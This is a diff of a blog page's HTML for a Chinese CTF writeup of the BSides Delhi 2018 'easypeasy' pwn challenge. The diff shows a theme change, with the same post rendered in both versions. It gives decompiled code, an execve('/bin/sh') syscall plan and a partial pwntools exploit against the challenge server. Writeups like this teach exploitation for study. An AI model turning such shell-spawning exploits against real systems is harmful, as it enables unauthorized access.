@@ -1,482 +1,286 @@
 <!DOCTYPE html>
+<html lang="zh-Hans">
 
 
 
 
 
-
-
-
-
-
-
-
-  
-
-
-<html class="theme-next pisces use-motion" lang="zh-Hans">
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
-
-<link rel="stylesheet" href="/css/main.css?v=7.1.0">
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.0">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.0">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.0">
-
-
-  <link rel="mask-icon" href="/images/logo.svg?v=7.1.0" color="#222">
-
-
-
-
-
-
-
-<script id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Pisces',
-    version: '7.1.0',
-    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
-    back2top: true,
-    back2top_sidebar: false,
-    fancybox: false,
-    fastclick: false,
-    lazyload: false,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
-  };
-</script>
-
-
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
   
+  <meta name="description" content="zs0zrc&#39;s blog">
+  <meta name="author" content="zs0zrc">
+  <meta name="keywords" content="pwn CTF security anythings">
+  <title>BSides Delhi CTF 2018 writeup - zs0zrc</title>
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
 
 
+  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
+
+<link rel="stylesheet" href="/css/main.css">
 
 
-  <meta name="description" content="easypeasy防护机制： 1234567☁  easy  checksec easypeasy  [*] &amp;apos;/home/zs0zrc/pwn/ BSides/easy/easypeasy&amp;apos;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:">
-<meta name="keywords" content="writeup,pwn">
-<meta property="og:type" content="article">
-<meta property="og:title" content="BSides Delhi CTF 2018 writeup">
-<meta property="og:url" content="http://yoursite.com/2018/10/27/2018-10-27-BSides-Delhi-CTF-2018-writeup/index.html">
-<meta property="og:site_name" content="zs0zrc">
-<meta property="og:description" content="easypeasy防护机制： 1234567☁  easy  checksec easypeasy  [*] &amp;apos;/home/zs0zrc/pwn/ BSides/easy/easypeasy&amp;apos;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:">
-<meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/picture/1540609852193.png">
-<meta property="og:updated_time" content="2019-01-13T03:42:59.769Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="BSides Delhi CTF 2018 writeup">
-<meta name="twitter:description" content="easypeasy防护机制： 1234567☁  easy  checksec easypeasy  [*] &amp;apos;/home/zs0zrc/pwn/ BSides/easy/easypeasy&amp;apos;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:">
-<meta name="twitter:image" content="http://yoursite.com/picture/1540609852193.png">
+  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
 
 
+<!-- 自定义样式保持在最底部 -->
 
-
-
-  
-  
-  <link rel="canonical" href="http://yoursite.com/2018/10/27/2018-10-27-BSides-Delhi-CTF-2018-writeup/">
-
-
-
-<script id="page.configurations">
-  CONFIG.page = {
-    sidebar: "",
-  };
-</script>
-
-  <title>BSides Delhi CTF 2018 writeup | zs0zrc</title>
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  <noscript>
-  <style>
-  .use-motion .motion-element,
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-title { opacity: initial; }
-
-  .use-motion .logo,
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
 
 </head>
 
-<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
 
-  
-  
-    
-  
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>zs0zrc</strong>&nbsp;</a>
 
-  <div class="container sidebar-position-left page-post-detail">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta">
-    
-
-    <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">zs0zrc</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-    
-    
-  </div>
-
-  <div class="site-nav-toggle">
-    <button aria-label="切换导航栏">
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
     </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">Home</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">Archives</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/categories/">Categories</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">Tags</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">About</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
   </div>
-</div>
-
-
-
-<nav class="site-nav">
-  
-    <ul id="menu" class="menu">
-      
-        
-        
-        
-          
-          <li class="menu-item menu-item-home">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-about">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-tags">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-categories">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-archives">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
-
-  </li>
-
-      
-      
-    </ul>
-  
-
-  
-
-  
 </nav>
 
-
-
-  
-
-
-
-</div>
-    </header>
-
-    
-  
-  
-
-  
-
-  <a href="https://github.com/zszcr" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
-
-
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-            
-
-          
-          <div id="content" class="content">
-            
-
-  <div id="posts" class="posts-expand">
-    
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/27/2018-10-27-BSides-Delhi-CTF-2018-writeup/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="zs0zrc">
-      <meta itemprop="description" content="zs0zrc's blog">
-      <meta itemprop="image" content="/images/avatar.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="zs0zrc">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">BSides Delhi CTF 2018 writeup
-
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2018-10-27 11:10:05" itemprop="dateCreated datePublished" datetime="2018-10-27T11:10:05+08:00">2018-10-27</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2019-01-13 11:42:59" itemprop="dateModified" datetime="2019-01-13T11:42:59+08:00">2019-01-13</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/CTF-s-writeup/" itemprop="url" rel="index"><span itemprop="name">CTF's writeup</span></a></span>
-
-                
-                
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
               
             </span>
-          
 
-          
             
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  Saturday, October 27th 2018, 11:10 am
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    1.8k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      8 分钟
+                  </span>
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
+                    <i class="far fa-eye" aria-hidden="true"></i>
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>
+                
+              </p>
             
-          
+          </div>
 
           
-          
-
-          
-
-          
-
-          
-
         </div>
-      </header>
-    
+      </div>
+    </div>
+  </header>
 
+  <main>
     
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
       
 
-      
-        <h3 id="easypeasy"><a href="#easypeasy" class="headerlink" title="easypeasy"></a>easypeasy</h3><p>防护机制：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">☁  easy  checksec easypeasy  </span><br><span class="line">[*] &apos;/home/zs0zrc/pwn/ BSides/easy/easypeasy&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
-<p>简单的运行了下，好像是让我们输入寄存器的值，一直循环输入</p>
-<p><img src="/picture/1540609852193.png" alt="1540609852193"></p>
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <h3 id="easypeasy"><a href="#easypeasy" class="headerlink" title="easypeasy"></a>easypeasy</h3><p>防护机制：</p>
+<pre><code>☁  easy  checksec easypeasy  
+[*] &#39;/home/zs0zrc/pwn/ BSides/easy/easypeasy&#39;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre><p>简单的运行了下，好像是让我们输入寄存器的值，一直循环输入</p>
+<p><img src="/picture/1540609852193.png" srcset="/img/loading.gif" alt="1540609852193"></p>
 <p>简单逆向下，程序主要逻辑在child函数中。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">noreturn <span class="title">child</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 buf[<span class="number">7</span>]; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  signal(<span class="number">14</span>, (<span class="keyword">__sighandler_t</span>)handler);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      get_obj(buf);</span><br><span class="line">      obj = buf[<span class="number">0</span>];</span><br><span class="line">      qword_6010A8 = buf[<span class="number">1</span>];</span><br><span class="line">      qword_6010B0 = buf[<span class="number">2</span>];</span><br><span class="line">      qword_6010B8 = buf[<span class="number">3</span>];</span><br><span class="line">      qword_6010C0 = buf[<span class="number">4</span>];</span><br><span class="line">      qword_6010C8 = buf[<span class="number">5</span>];</span><br><span class="line">      qword_6010D0 = buf[<span class="number">6</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)validate_syscall_obj(buf[<span class="number">0</span>]) );</span><br><span class="line">    raise(<span class="number">14</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __<span class="function">fastcall <span class="title">get_obj</span><span class="params">(_QWORD *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"RAX: "</span>);</span><br><span class="line">  *buf = get_ll();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"RDI: "</span>);</span><br><span class="line">  buf[<span class="number">1</span>] = get_ll();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"RSI: "</span>);</span><br><span class="line">  buf[<span class="number">2</span>] = get_ll();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"RDX: "</span>);</span><br><span class="line">  buf[<span class="number">3</span>] = get_ll();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"RCX: "</span>);</span><br><span class="line">  buf[<span class="number">4</span>] = get_ll();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"R8: "</span>);</span><br><span class="line">  buf[<span class="number">5</span>] = get_ll();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"R9: "</span>);</span><br><span class="line">  buf[<span class="number">6</span>] = get_ll();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="c">void __noreturn child()
+{
+  __int64 buf[7]; // [rsp+0h] [rbp-40h]
+  unsigned __int64 v1; // [rsp+38h] [rbp-8h]
+
+  v1 = __readfsqword(0x28u);
+  signal(14, (__sighandler_t)handler);
+  while ( 1 )
+  {
+    do
+    {
+      get_obj(buf);
+      obj = buf[0];
+      qword_6010A8 = buf[1];
+      qword_6010B0 = buf[2];
+      qword_6010B8 = buf[3];
+      qword_6010C0 = buf[4];
+      qword_6010C8 = buf[5];
+      qword_6010D0 = buf[6];
+    }
+    while ( (unsigned int)validate_syscall_obj(buf[0]) );
+    raise(14);
+  }
+}
+
+__int64 __fastcall get_obj(_QWORD *buf)
+{
+  printf(&quot;RAX: &quot;);
+  *buf = get_ll();
+  printf(&quot;RDI: &quot;);
+  buf[1] = get_ll();
+  printf(&quot;RSI: &quot;);
+  buf[2] = get_ll();
+  printf(&quot;RDX: &quot;);
+  buf[3] = get_ll();
+  printf(&quot;RCX: &quot;);
+  buf[4] = get_ll();
+  printf(&quot;R8: &quot;);
+  buf[5] = get_ll();
+  printf(&quot;R9: &quot;);
+  buf[6] = get_ll();
+  return 0LL;
+}
+</code></pre>
 <blockquote>
 <p>singal()函数声明<br>void (<em>signal(int sig, void (</em>func)(int)))(int)  ，第一个参数为要处理的信号，第二个参数为处理方法</p>
 <p>raise()函数声明<br>int raise(int sig)  这里参数为要发送的信号码，这个函数会促使生成信号sig</p>
 </blockquote>
 <p>这里用signal函数给信号14也就是SIGALRM信号  设置了一个处理方法，然后循环读取寄存器的值，将这些值存入bss段上的变量中，每读取完一次后调用一次validate_syscall_obj函数，如果validate_syscall_obj函数返回值为0，就调用raise(14)函数,生成信号SIGALRM。然后就会调用handler函数，否则就进行下一次循环。如果想调用handler函数，那么rax的值就必须为1，2，3，60这四个数中的一个，或者是等30秒，程序调用alarm函数。</p>
 <p>贴下linux支持的信号表：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Linux支持的信号列表如下。很多信号是与机器的体系结构相关的</span><br><span class="line"></span><br><span class="line">信号  信号值 默认处理动作 发出信号的原因</span><br><span class="line">SIGHUP 1 A 终端挂起或者控制进程终止</span><br><span class="line">SIGINT 2 A 键盘中断（如break键被按下）</span><br><span class="line">SIGQUIT 3 C 键盘的退出键被按下</span><br><span class="line">SIGILL 4 C 非法指令</span><br><span class="line">SIGABRT 6 C 由abort(3)发出的退出指令</span><br><span class="line">SIGFPE 8 C 浮点异常</span><br><span class="line">SIGKILL 9 AEF Kill信号</span><br><span class="line">SIGSEGV 11 C 无效的内存引用</span><br><span class="line">SIGPIPE 13 A 管道破裂: 写一个没有读端口的管道</span><br><span class="line">SIGALRM 14 A 由alarm(2)发出的信号</span><br><span class="line">SIGTERM 15 A 终止信号</span><br><span class="line">SIGUSR1 30,10,16 A 用户自定义信号1</span><br><span class="line">SIGUSR2 31,12,17 A 用户自定义信号2</span><br><span class="line">SIGCHLD 20,17,18 B 子进程结束信号</span><br><span class="line">SIGCONT 19,18,25 进程继续（曾被停止的进程）</span><br><span class="line">SIGSTOP 17,19,23 DEF 终止进程</span><br><span class="line">SIGTSTP 18,20,24 D 控制终端（tty）上按下停止键</span><br><span class="line">SIGTTIN 21,21,26 D 后台进程企图从控制终端读</span><br><span class="line">SIGTTOU 22,22,27 D 后台进程企图从控制终端写</span><br></pre></td></tr></table></figure>
-<p>handler函数</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">handler</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  exec_syscall_obj(&amp;obj);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __<span class="function">fastcall <span class="title">exec_syscall_obj</span><span class="params">(_QWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *v1; <span class="comment">// rbx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v4; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v7; <span class="comment">// r8</span></span><br><span class="line">  __int64 v8; <span class="comment">// r9</span></span><br><span class="line"></span><br><span class="line">  v1 = a1;</span><br><span class="line">  result = *a1;</span><br><span class="line">  v3 = a1[<span class="number">1</span>];</span><br><span class="line">  v4 = v1[<span class="number">2</span>];</span><br><span class="line">  v5 = v1[<span class="number">3</span>];</span><br><span class="line">  v6 = v1[<span class="number">4</span>];</span><br><span class="line">  v7 = v1[<span class="number">5</span>];</span><br><span class="line">  v8 = v1[<span class="number">6</span>];</span><br><span class="line">  __asm &#123; syscall; LINUX - &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;<span class="comment">//exec_syscall_obj就是根据输入的寄存器的值执行了一次syscall</span></span><br></pre></td></tr></table></figure>
+<pre><code>Linux支持的信号列表如下。很多信号是与机器的体系结构相关的
+
+信号  信号值 默认处理动作 发出信号的原因
+SIGHUP 1 A 终端挂起或者控制进程终止
+SIGINT 2 A 键盘中断（如break键被按下）
+SIGQUIT 3 C 键盘的退出键被按下
+SIGILL 4 C 非法指令
+SIGABRT 6 C 由abort(3)发出的退出指令
+SIGFPE 8 C 浮点异常
+SIGKILL 9 AEF Kill信号
+SIGSEGV 11 C 无效的内存引用
+SIGPIPE 13 A 管道破裂: 写一个没有读端口的管道
+SIGALRM 14 A 由alarm(2)发出的信号
+SIGTERM 15 A 终止信号
+SIGUSR1 30,10,16 A 用户自定义信号1
+SIGUSR2 31,12,17 A 用户自定义信号2
+SIGCHLD 20,17,18 B 子进程结束信号
+SIGCONT 19,18,25 进程继续（曾被停止的进程）
+SIGSTOP 17,19,23 DEF 终止进程
+SIGTSTP 18,20,24 D 控制终端（tty）上按下停止键
+SIGTTIN 21,21,26 D 后台进程企图从控制终端读
+SIGTTOU 22,22,27 D 后台进程企图从控制终端写
+</code></pre><p>handler函数</p>
+<pre><code class="c">void handler()
+{
+  exec_syscall_obj(&amp;obj);
+}
+
+__int64 __fastcall exec_syscall_obj(_QWORD *a1)
+{
+  _QWORD *v1; // rbx
+  __int64 result; // rax
+  __int64 v3; // rdi
+  __int64 v4; // rsi
+  __int64 v5; // rdx
+  __int64 v6; // rcx
+  __int64 v7; // r8
+  __int64 v8; // r9
+
+  v1 = a1;
+  result = *a1;
+  v3 = a1[1];
+  v4 = v1[2];
+  v5 = v1[3];
+  v6 = v1[4];
+  v7 = v1[5];
+  v8 = v1[6];
+  __asm { syscall; LINUX - }
+  return result;
+}//exec_syscall_obj就是根据输入的寄存器的值执行了一次syscall
+
+</code></pre>
 <p>做法一:</p>
 <p>构造execve(“/bin/sh”,0,0)的syscall来getshell</p>
 <p>做法二：</p>
@@ -495,13 +299,56 @@
 <p>rax : 0x3b    rdi :  address of “/bin/sh\x00”    rsi : 0    rdx : 0</p>
 </blockquote>
 <p>exp: </p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./easypeasy'</span>)</span><br><span class="line">    elf = ELF(<span class="string">'./easypeasy'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">"35.200.228.122"</span>,<span class="number">1337</span>)</span><br><span class="line">    elf = ELF(<span class="string">'./easypeasy'</span>)</span><br><span class="line"></span><br><span class="line">context.arch = elf.arch</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(rax,rdi,rsi,rdx,rcx,r8,r9)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'RAX: '</span>, rax)</span><br><span class="line">    p.sendlineafter(<span class="string">'RDI: '</span>, rdi)</span><br><span class="line">    p.sendlineafter(<span class="string">'RSI: '</span>, rsi)</span><br><span class="line">    p.sendlineafter(<span class="string">'RDX: '</span>, rdx)</span><br><span class="line">    p.sendlineafter(<span class="string">'RCX: '</span>, rcx)</span><br><span 